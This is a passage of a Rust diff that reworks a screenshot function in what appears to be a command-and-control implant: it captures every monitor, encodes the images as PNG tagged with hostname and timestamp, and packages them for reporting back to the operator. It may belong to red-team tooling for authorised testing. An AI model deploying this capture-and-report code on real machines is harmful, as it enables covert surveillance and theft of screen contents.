@@ -3,47 +3,37 @@ use alloc::sync::Arc;
 use alloc::vec::Vec;
 use chrono::Utc;
 use eldritch_agent::{Agent, Context};
-use image::ImageFormat;
 use pb::c2::{self, report_file_request};
 use pb::eldritch;
 use std::io::Cursor;
 use xcap::Monitor;
+use xcap::image::ImageFormat;
 
 pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
     let monitors = Monitor::all().map_err(|e| e.to_string())?;
 
-    if monitors.is_empty() {
-        return Err("No monitors found".to_string());
-    }
-
-    let config = agent.get_config()?;
-    // Get hostname from config or default to "unknown"
-    let hostname = config
-        .get("hostname")
-        .cloned()
-        .unwrap_or_else(|| "unknown".to_string());
-
+    // Get hostname, handling potential failure or deprecation
+    let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string());
     let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
 
-    for (index, monitor) in monitors.iter().enumerate() {
+    for (i, monitor) in monitors.iter().enumerate() {
         let image = monitor.capture_image().map_err(|e| e.to_string())?;
-
-        let mut bytes: Vec<u8> = Vec::new();
+        let mut buffer = Vec::new();
         image
-            .write_to(&mut Cursor::new(&mut bytes), ImageFormat::Png)
+            .write_to(&mut Cursor::new(&mut buffer), ImageFormat::Png)
             .map_err(|e| e.to_string())?;
 
-        let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, index);
+        let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, i);
 
         let metadata = eldritch::FileMetadata {
             path: filename.clone(),
-            size: bytes.len() as u64,
+            size: buffer.len() as u64,
             ..Default::default()
         };
 
         let file_msg = eldritch::File {
             metadata: Some(metadata),
-            chunk: bytes,
+            chunk: buffer,
         };
 
         let context_val = match context.clone() {
